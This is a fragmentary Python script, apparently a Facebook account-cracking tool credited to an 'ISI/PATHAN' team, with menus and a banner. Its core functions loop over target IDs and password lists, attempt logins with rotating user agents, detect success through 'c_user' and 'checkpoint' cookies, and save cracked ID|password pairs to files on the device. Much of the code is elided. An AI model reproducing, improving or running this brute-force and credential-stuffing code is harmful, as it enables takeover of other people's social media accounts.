...
try:
	...
	os.system('python P̳A̳T̳H̳A̳N̳.py')
ugen = []
...
--------------------------------------------------
>>  Owner    : P̳A̳T̳H̳A̳N̳
>>  Facebook : K̳H̳A̳M̳A̳R̳
>>  Version  : 1.0
>>  Team❤    : I̳S̳I̳/̳P̳A̳T̳H̳A̳N̳
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> ISI/USMII TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/P̳A̳T̳H̳A̳N̳.txt')
				linex()
				...
				os.system('python BADSHA.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100006814218623&mibextid=ZbWKwL/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ISI / USMI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			P̳A̳T̳H̳A̳N̳=session.cookies.get_dict().keys()
			if "c_user" in P̳A̳T̳H̳A̳N̳:
				print('\r\r\033[1;31m[P̳A̳T̳H̳A̳N̳-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/P̳A̳T̳H̳A̳N̳-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in P̳A̳T̳H̳A̳N̳:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[P̳A̳T̳H̳A̳N̳-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/P̳A̳T̳H̳A̳N̳-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ISI / USMI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in P̳A̳T̳H̳A̳N̳:
				...
				print('\r\r\033[1;32m[P̳A̳T̳H̳A̳N̳-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[P̳A̳T̳H̳A̳N̳-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mISI / USMI\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[P̳A̳T̳H̳A̳N̳-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[P̳A̳T̳H̳A̳N̳-OK] '+cid+' | '+ps+'\33[0;97m')
